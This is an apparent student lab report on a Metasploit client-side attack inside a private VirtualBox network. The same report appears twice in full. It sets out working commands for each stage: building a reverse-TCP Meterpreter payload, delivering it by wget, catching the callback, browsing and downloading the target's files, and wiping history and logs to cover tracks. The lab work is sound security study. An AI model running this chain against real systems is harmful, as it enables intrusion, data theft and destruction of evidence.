# Metasploit Client-Side Exploitation Lab Report

**Date:** 2026-09-28  
**Attacker Machine:** Main Kali Linux (192.168.0.x / 192.168.56.1)  
**Target Machine:** VirtualBox Kali Linux (192.168.56.x)  
**Method:** Reverse TCP Meterpreter via msfvenom payload  

---

## Overview

This lab demonstrates a **client-side attack** using Metasploit. Instead of exploiting a vulnerable service directly, a malicious payload (disguised as a normal Linux file) was created and delivered to the target machine. When the target ran the file, it silently called back to the attacker's listener, giving full remote access via Meterpreter.

This simulates how real-world attacks work — phishing emails, fake downloads, malicious attachments.

---

## Lab Environment Setup

### Network Configuration (VirtualBox)

Both machines needed to be on the **same network** to communicate.

| Machine | Adapter 1 | Adapter 2 |
|---|---|---|
| Main Kali (attacker) | NAT | Host-only (vboxnet0) |
| VB Kali (target) | Host-only (vboxnet0) | NAT |

> **Why host-only?** The host-only network (192.168.56.x) is a private network shared between the host machine and VMs. Both machines can reach each other through it without internet exposure.

---

## Step 1 — Create the Malicious Payload

**Run this on Main Kali (outside Metasploit, in a normal terminal):**

```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.56.1 LPORT=4444 -f elf -o payload.elf
```

**What each part means:**
- `msfvenom` — Metasploit's payload builder tool (runs outside msfconsole)
- `-p linux/x86/meterpreter/reverse_tcp` — the type of payload (Linux, 32-bit, reverse connection)
- `LHOST=192.168.56.1` — **attacker's IP** (the machine that will receive the callback)
- `LPORT=4444` — the port the payload will call back on
- `-f elf` — output format (ELF = Linux executable)
- `-o payload.elf` — save it as this filename

**Expected output:**
```
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 120 bytes
Final size of elf file: 204 bytes
Saved as: payload.elf
```

> The warning lines are **not errors** — msfvenom just auto-selected the platform and architecture.

---

## Step 2 — Set Up the Listener (Inside Metasploit)

**Open Metasploit on Main Kali:**

```bash
msfconsole
```

**Inside msfconsole, run these commands one by one:**

```
use exploit/multi/handler
set payload linux/x86/meterpreter/reverse_tcp
set LHOST 192.168.56.1
set LPORT 4444
exploit
```

**What each part does:**
- `use exploit/multi/handler` — the module that catches incoming reverse connections
- `set payload ...` — must match exactly what was used in msfvenom
- `set LHOST` — attacker's IP (must be reachable from the target)
- `set LPORT` — must match the port in the payload
- `exploit` — starts listening

**Expected output:**
```
[*] Started reverse TCP handler on 192.168.56.1:4444
```

The listener is now waiting for the payload to call back.

---

## Step 3 — Deliver the Payload to the Target

**Start a Python HTTP server on Main Kali (new terminal tab):**

```bash
python3 -m http.server 8080
```

This serves files from the current directory over HTTP so the target can download them.

**On VB Kali, download the payload:**

Option A — use wget in terminal:
```bash
wget http://192.168.56.1:8080/payload.elf -O /home/kali/Downloads/payload.elf
```

Option B — open the browser on VB Kali and go to `http://192.168.56.1:8080` then click the file.

---

## Step 4 — Run the Payload on the Target

**On VB Kali:**

```bash
chmod +x /home/kali/Downloads/payload.elf
/home/kali/Downloads/payload.elf
```

- `chmod +x` — gives the file permission to run (Linux files must be explicitly made executable)
- Running the file = "clicking" it — it executes silently and calls back to the attacker

**On Main Kali (Metasploit listener), you will immediately see:**

```
[*] Sending stage (1017704 bytes) to 192.168.56.x
[*] Meterpreter session 1 opened (192.168.56.1:4444 -> 192.168.56.x:xxxxx)

meterpreter >
```

You now have remote access to the target machine.

---

## Step 5 — Meterpreter Commands Used

### Recon (finding out about the target machine)

```bash
sysinfo       # shows OS, computer name, architecture
getuid        # shows what user you're running as
getpid        # shows the process ID of your session
```

**Output from sysinfo:**
```
Computer     : kali
OS           : Debian  (Linux 6.19.14+kali-amd64)
Architecture : x64
Meterpreter  : x86/linux
```

---

### Browsing the target's files

```bash
pwd           # shows current directory you're in
ls            # lists files and folders
dir           # same as ls
cd /home/kali/Pictures    # navigate into a folder
download /home/kali/Pictures/filename.png   # steal a file to your machine
```

> Note: `download` only works with files that actually exist. Using a fake filename returns an error.

---

### Seeing running processes

```bash
ps
```

Lists every running process on the target. Notably, the payload shows up here:
```
13984  1873   payload.elf   x86   kali   /home/kali/Downloads/payload.elf
```

> In a real investigation, a SOC analyst seeing `payload.elf` in the process list would immediately flag it as suspicious.

---

### Getting a real terminal on the target

```bash
shell
```

Drops you into a real command line on the target machine. Type `exit` to return to meterpreter.

---

### Commands that did NOT work (and why)

| Command | Error | Reason |
|---|---|---|
| `screenshot` | Not supported | Payload was x86/linux — screenshot not available on this meterpreter type |
| `getsystem` | Requires "priv" extension | Need to run `load priv` first |
| `downloads` | Unknown command | Correct command is `download` (no 's') |
| `cd downloads` | Operation failed | Case-sensitive — must match exact folder name (capital D: `Downloads`) |

---

## Step 6 — Covering Tracks (Post-Exploitation)

After getting access, an attacker might try to hide evidence.

### What was attempted:

```bash
shell
history -c
cat /dev/null > ~/.zsh_history     # wipe command history (works)
cat /dev/null > /var/log/syslog    # wipe system log (FAILED - no root access)
```

### What happened:

Wiping `/var/log/syslog` requires **root permission**. Since `getuid` showed the session was running as `kali` (not root), the command failed and caused the meterpreter session to crash with a timeout error.

**The error:**
```
[09/28/2026 01:04:37] [w(0)] core: Session 1 has died
[09/28/2026 01:04:47] [e(0)] core: Rex::TimeoutError Send timed out
```

**Fix:** Press `q` to exit the error log view, then run the payload again on VB Kali to get a new session.

### What works without root:

```bash
cat /dev/null > ~/.zsh_history     # clear personal shell history
cat /dev/null > ~/.bash_history    # clear bash history
rm /home/kali/Downloads/payload.elf  # delete the payload file
```

> **Important note:** In an authorized penetration test, you do NOT cover your tracks. You document everything. Covering tracks is what malicious attackers do — knowing it helps defenders understand what to look for.

---

## Errors Made & Corrections

### Error 1 — Wrong LHOST in payload

**Mistake:** Used `192.168.0.x` (main Kali's regular IP) as LHOST instead of the host-only IP.

**What happened:** VB Kali could not reach 192.168.0.x because it was only connected to the 192.168.56.x (host-only) network. The payload ran but couldn't call back — no session was created.

**Fix:** Rebuild the payload using `LHOST=192.168.56.1` (the host-only network IP that both machines share).

---

### Error 2 — Typo in python server command

**Mistake:** Typed `python3 -m http.server 8080~` with a tilde at the end.

**Error message:**
```
python3 -m http.server: error: argument port: invalid int value: '8080~'
```

**Fix:** Remove the `~` — run `python3 -m http.server 8080`

---

### Error 3 — Wrong file path when running payload

**Mistake:** Tried `chmod +x /tmp/payload.elf` but the file was in Downloads, not /tmp.

**Fix:** Use `find / -name "payload.elf" 2>/dev/null` to locate the actual file path, then use the correct path: `/home/kali/Downloads/payload.elf`

---

### Error 4 — Trying to download a file that doesn't exist

**Mistake:** Ran `download /home/kali/somefile.txt` — that file doesn't exist.

**Error:**
```
[-] stdapi_fs_stat: Operation failed: 1
```

**Fix:** First run `ls` to see what files actually exist, then download a real file by its exact name.

---

### Error 5 — Session crashed after trying to clear root-owned logs

**Mistake:** Ran `cat /dev/null > /var/log/syslog` inside a shell without root privileges.

**What happened:** Permission denied caused the session to hang and eventually timeout, killing the meterpreter connection.

**Fix:** Press `q` to exit the error screen. Re-run the payload on VB Kali to open a new session. Only attempt to clear files you have permission to access.

---

## Summary — How the Attack Worked

```
[Main Kali - Attacker]              [VB Kali - Target]
       |                                    |
1. msfvenom creates payload.elf             |
       |                                    |
2. Python HTTP server started               |
       |                                    |
3.                          <-- Downloads payload.elf
       |                                    |
4. Metasploit listener waiting              |
       |                                    |
5.                          <-- Runs payload.elf
       |                                    |
6. Payload calls back to 192.168.56.1:4444  |
       |<-----------------------------------|
7. Meterpreter session opened               |
       |                                    |
8. Attacker browses files, views processes, downloads data
```

---

## Key Concepts to Remember

**LHOST** = always the **attacker's IP** — where the payload calls back to.

**LPORT** = the port the listener waits on — must match between payload and listener.

**Reverse shell** = victim calls the attacker (not the other way around). This bypasses firewalls because the connection comes from inside the target network going outward.

**ELF file** = Linux executable. Equivalent to .exe on Windows. Running it in terminal is the same as "double-clicking" it.

**multi/handler** = Metasploit module used to catch reverse connections from payloads you created yourself.

**Meterpreter** = an advanced shell that gives you file browsing, process viewing, downloading, screenshot capabilities and more — all over an encrypted channel.


# Metasploit Client-Side Exploitation Lab Report

**Date:** 2026-09-28  
**Attacker Machine:** Main Kali Linux (192.168.0.x / 192.168.56.1)  
**Target Machine:** VirtualBox Kali Linux (192.168.56.x)  
**Method:** Reverse TCP Meterpreter via msfvenom payload  

---

## Overview

This lab demonstrates a **client-side attack** using Metasploit. Instead of exploiting a vulnerable service directly, a malicious payload (disguised as a normal Linux file) was created and delivered to the target machine. When the target ran the file, it silently called back to the attacker's listener, giving full remote access via Meterpreter.

This simulates how real-world attacks work — phishing emails, fake downloads, malicious attachments.

---

## Lab Environment Setup

### Network Configuration (VirtualBox)

Both machines needed to be on the **same network** to communicate.

| Machine | Adapter 1 | Adapter 2 |
|---|---|---|
| Main Kali (attacker) | NAT | Host-only (vboxnet0) |
| VB Kali (target) | Host-only (vboxnet0) | NAT |

> **Why host-only?** The host-only network (192.168.56.x) is a private network shared between the host machine and VMs. Both machines can reach each other through it without internet exposure.

---

## Step 1 — Create the Malicious Payload

**Run this on Main Kali (outside Metasploit, in a normal terminal):**

```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.56.1 LPORT=4444 -f elf -o payload.elf
```

**What each part means:**
- `msfvenom` — Metasploit's payload builder tool (runs outside msfconsole)
- `-p linux/x86/meterpreter/reverse_tcp` — the type of payload (Linux, 32-bit, reverse connection)
- `LHOST=192.168.56.1` — **attacker's IP** (the machine that will receive the callback)
- `LPORT=4444` — the port the payload will call back on
- `-f elf` — output format (ELF = Linux executable)
- `-o payload.elf` — save it as this filename

**Expected output:**
```
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 120 bytes
Final size of elf file: 204 bytes
Saved as: payload.elf
```

> The warning lines are **not errors** — msfvenom just auto-selected the platform and architecture.

---

## Step 2 — Set Up the Listener (Inside Metasploit)

**Open Metasploit on Main Kali:**

```bash
msfconsole
```

**Inside msfconsole, run these commands one by one:**

```
use exploit/multi/handler
set payload linux/x86/meterpreter/reverse_tcp
set LHOST 192.168.56.1
set LPORT 4444
exploit
```

**What each part does:**
- `use exploit/multi/handler` — the module that catches incoming reverse connections
- `set payload ...` — must match exactly what was used in msfvenom
- `set LHOST` — attacker's IP (must be reachable from the target)
- `set LPORT` — must match the port in the payload
- `exploit` — starts listening

**Expected output:**
```
[*] Started reverse TCP handler on 192.168.56.1:4444
```

The listener is now waiting for the payload to call back.

---

## Step 3 — Deliver the Payload to the Target

**Start a Python HTTP server on Main Kali (new terminal tab):**

```bash
python3 -m http.server 8080
```

This serves files from the current directory over HTTP so the target can download them.

**On VB Kali, download the payload:**

Option A — use wget in terminal:
```bash
wget http://192.168.56.1:8080/payload.elf -O /home/kali/Downloads/payload.elf
```

Option B — open the browser on VB Kali and go to `http://192.168.56.1:8080` then click the file.

---

## Step 4 — Run the Payload on the Target

**On VB Kali:**

```bash
chmod +x /home/kali/Downloads/payload.elf
/home/kali/Downloads/payload.elf
```

- `chmod +x` — gives the file permission to run (Linux files must be explicitly made executable)
- Running the file = "clicking" it — it executes silently and calls back to the attacker

**On Main Kali (Metasploit listener), you will immediately see:**

```
[*] Sending stage (1017704 bytes) to 192.168.56.x
[*] Meterpreter session 1 opened (192.168.56.1:4444 -> 192.168.56.x:xxxxx)

meterpreter >
```

You now have remote access to the target machine.

---

## Step 5 — Meterpreter Commands Used

### Recon (finding out about the target machine)

```bash
sysinfo       # shows OS, computer name, architecture
getuid        # shows what user you're running as
getpid        # shows the process ID of your session
```

**Output from sysinfo:**
```
Computer     : kali
OS           : Debian  (Linux 6.19.14+kali-amd64)
Architecture : x64
Meterpreter  : x86/linux
```

---

### Browsing the target's files

```bash
pwd           # shows current directory you're in
ls            # lists files and folders
dir           # same as ls
cd /home/kali/Pictures    # navigate into a folder
download /home/kali/Pictures/filename.png   # steal a file to your machine
```

> Note: `download` only works with files that actually exist. Using a fake filename returns an error.

---

### Seeing running processes

```bash
ps
```

Lists every running process on the target. Notably, the payload shows up here:
```
13984  1873   payload.elf   x86   kali   /home/kali/Downloads/payload.elf
```

> In a real investigation, a SOC analyst seeing `payload.elf` in the process list would immediately flag it as suspicious.

---

### Getting a real terminal on the target

```bash
shell
```

Drops you into a real command line on the target machine. Type `exit` to return to meterpreter.

---

### Commands that did NOT work (and why)

| Command | Error | Reason |
|---|---|---|
| `screenshot` | Not supported | Payload was x86/linux — screenshot not available on this meterpreter type |
| `getsystem` | Requires "priv" extension | Need to run `load priv` first |
| `downloads` | Unknown command | Correct command is `download` (no 's') |
| `cd downloads` | Operation failed | Case-sensitive — must match exact folder name (capital D: `Downloads`) |

---

## Step 6 — Covering Tracks (Post-Exploitation)

After getting access, an attacker might try to hide evidence.

### What was attempted:

```bash
shell
history -c
cat /dev/null > ~/.zsh_history     # wipe command history (works)
cat /dev/null > /var/log/syslog    # wipe system log (FAILED - no root access)
```

### What happened:

Wiping `/var/log/syslog` requires **root permission**. Since `getuid` showed the session was running as `kali` (not root), the command failed and caused the meterpreter session to crash with a timeout error.

**The error:**
```
[09/28/2026 01:04:37] [w(0)] core: Session 1 has died
[09/28/2026 01:04:47] [e(0)] core: Rex::TimeoutError Send timed out
```

**Fix:** Press `q` to exit the error log view, then run the payload again on VB Kali to get a new session.

### What works without root:

```bash
cat /dev/null > ~/.zsh_history     # clear personal shell history
cat /dev/null > ~/.bash_history    # clear bash history
rm /home/kali/Downloads/payload.elf  # delete the payload file
```

> **Important note:** In an authorized penetration test, you do NOT cover your tracks. You document everything. Covering tracks is what malicious attackers do — knowing it helps defenders understand what to look for.

---

## Errors Made & Corrections

### Error 1 — Wrong LHOST in payload

**Mistake:** Used `192.168.0.x` (main Kali's regular IP) as LHOST instead of the host-only IP.

**What happened:** VB Kali could not reach 192.168.0.x because it was only connected to the 192.168.56.x (host-only) network. The payload ran but couldn't call back — no session was created.

**Fix:** Rebuild the payload using `LHOST=192.168.56.1` (the host-only network IP that both machines share).

---

### Error 2 — Typo in python server command

**Mistake:** Typed `python3 -m http.server 8080~` with a tilde at the end.

**Error message:**
```
python3 -m http.server: error: argument port: invalid int value: '8080~'
```

**Fix:** Remove the `~` — run `python3 -m http.server 8080`

---

### Error 3 — Wrong file path when running payload

**Mistake:** Tried `chmod +x /tmp/payload.elf` but the file was in Downloads, not /tmp.

**Fix:** Use `find / -name "payload.elf" 2>/dev/null` to locate the actual file path, then use the correct path: `/home/kali/Downloads/payload.elf`

---

### Error 4 — Trying to download a file that doesn't exist

**Mistake:** Ran `download /home/kali/somefile.txt` — that file doesn't exist.

**Error:**
```
[-] stdapi_fs_stat: Operation failed: 1
```

**Fix:** First run `ls` to see what files actually exist, then download a real file by its exact name.

---

### Error 5 — Session crashed after trying to clear root-owned logs

**Mistake:** Ran `cat /dev/null > /var/log/syslog` inside a shell without root privileges.

**What happened:** Permission denied caused the session to hang and eventually timeout, killing the meterpreter connection.

**Fix:** Press `q` to exit the error screen. Re-run the payload on VB Kali to open a new session. Only attempt to clear files you have permission to access.

---

## Summary — How the Attack Worked

```
[Main Kali - Attacker]              [VB Kali - Target]
       |                                    |
1. msfvenom creates payload.elf             |
       |                                    |
2. Python HTTP server started               |
       |                                    |
3.                          <-- Downloads payload.elf
       |                                    |
4. Metasploit listener waiting              |
       |                                    |
5.                          <-- Runs payload.elf
       |                                    |
6. Payload calls back to 192.168.56.1:4444  |
       |<-----------------------------------|
7. Meterpreter session opened               |
       |                                    |
8. Attacker browses files, views processes, downloads data
```

---

## Key Concepts to Remember

**LHOST** = always the **attacker's IP** — where the payload calls back to.

**LPORT** = the port the listener waits on — must match between payload and listener.

**Reverse shell** = victim calls the attacker (not the other way around). This bypasses firewalls because the connection comes from inside the target network going outward.

**ELF file** = Linux executable. Equivalent to .exe on Windows. Running it in terminal is the same as "double-clicking" it.

**multi/handler** = Metasploit module used to catch reverse connections from payloads you created yourself.

**Meterpreter** = an advanced shell that gives you file browsing, process viewing, downloading, screenshot capabilities and more — all over an encrypted channel.